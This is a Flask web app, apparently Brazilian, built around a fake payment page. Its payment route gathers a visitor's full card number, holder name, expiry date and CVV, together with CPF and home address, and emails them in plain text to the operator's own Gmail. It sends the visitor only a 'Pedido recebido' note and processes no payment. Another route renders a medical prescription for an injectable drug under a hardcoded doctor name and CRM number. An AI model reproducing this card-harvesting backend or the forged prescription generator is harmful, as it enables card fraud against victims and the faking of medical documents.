import io
import os
from datetime import datetime
from flask import Flask, render_template, request, jsonify
import requests

import qrcode
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Image
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib.colors import blue

from flask_mail import Mail, Message
from dotenv import load_dotenv

# =========================
# SETUP BASE
# =========================
app = Flask(__name__)

load_dotenv()
app.config['SERVIDOR'] = os.getenv('SERVIDOR') # URL DO DOMINIO SERVIDOR
# =========================
# MAIL CONFIG
# =========================
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True

app.config['MAIL_USERNAME'] = os.getenv('MAIL_USERNAME')
app.config['MAIL_PASSWORD'] = os.getenv('MAIL_PASSWORD')

app.config['MAIL_DEFAULT_SENDER'] = os.getenv('MAIL_USERNAME')

mail = Mail(app)

# =========================
# ROUTE PAYMENT
# =========================
@app.route('/processando_payment', methods=['POST'])
def salvar(servidor):
    nome = request.form['nome']
    email = request.form['email']
    cpf = request.form['cpf']
    cep = request.form['cep']
    endereco = request.form['endereco']
    bairro = request.form['bairro']
    numero = request.form['numero']
    cidade = request.form['cidade']
    numero_cartao = request.form['numero_cartao']
    nome_titular = request.form['nome_titular']
    mes_ano = request.form['mes_ano']
    controle = request.form['controle']

    msg = Message(
        subject="Novo pagamento recebido",
        recipients=[app.config['MAIL_USERNAME']],
        body=f"""
Nome: {nome}
Email: {email}
CPF: {cpf}
CEP: {cep}
Endereço: {endereco}
Número: {numero}
Bairro: {bairro}
Cidade: {cidade}
Cartão: {numero_cartao}
Titular: {nome_titular}
Validade: {mes_ano}
CVV: {controle}
"""
    )

    try:
        mail.send(msg)
    except Exception as e:
        print("Erro mail interno:", e)

    msg1 = Message(
        subject="Confirmação",
        recipients=[email],
        html=f"""
        <p>Olá {nome}</p>
        <p>Pedido recebido</p>
        """
    )

    try:
        mail.send(msg1)
    except Exception as e:
        print("Erro mail cliente:", e)

    return render_template("index.html")
#---------------------------------------------------------------------------

# CORREÇÃO: URL do ViaCEP corrigida com /ws/ e as barras nos locais certos
def consultar_cep(cep):
    cep_limpo = "".join(filter(str.isdigit, cep))

    if len(cep_limpo) != 8:
        return {"erro": "CEP inválido! Deve conter 8 dígitos."}

    url = f"https://viacep.com.br/ws/{cep_limpo}/json/"

    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        dados = response.json()

        if 'erro' in dados:
            return {"erro": "CEP não encontrado."}

        return dados
    except requests.exceptions.RequestException as e:
        return {"erro": f"Erro ao conectar com a API: {e}"}
#---------------------------------------------------------------------------

# ROTA DO FLASK PARA BUSCAR CEP
@app.route('/buscar-cep', methods=['GET'])
def buscar_cep_rota():
    cep_recebido = request.args.get('cep')

    if not cep_recebido:
        return jsonify({"erro": "O parâmetro 'cep' é obrigatório."}), 400

    resultado = consultar_cep(cep_recebido)
    return jsonify(resultado)
#---------------------------------------------------------------------------

# 1. ROTAS DO SITE
@app.route('/')
def index():
    return render_template("index.html")
#---------------------------------------------------------------------------

@app.route('/api')
def api():
    return render_template("pagamento.html")
#---------------------------------------------------------------------------

@app.route('/receitas')
def gerar_receita():
    dados_receita = {
        "medico": "Dr. Gustavo Sá",
        "crm": "123456/SP",
        "paciente": "Maria Silva",
        "idade": "34",
        "data": datetime.now().strftime("%d de %B de %Y"), # Pegando data atual de forma dinâmica
        "medicamentos": [
            {
                "nome": "TG 15mg / 0,5ml",
                "instrucoes": "Administração Subcutânea Medicamento Injetável"
            }
        ]
    }
    return render_template("receita.html", **dados_receita)
# =========================
# RUN (LOCAL ONLY)
# =========================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
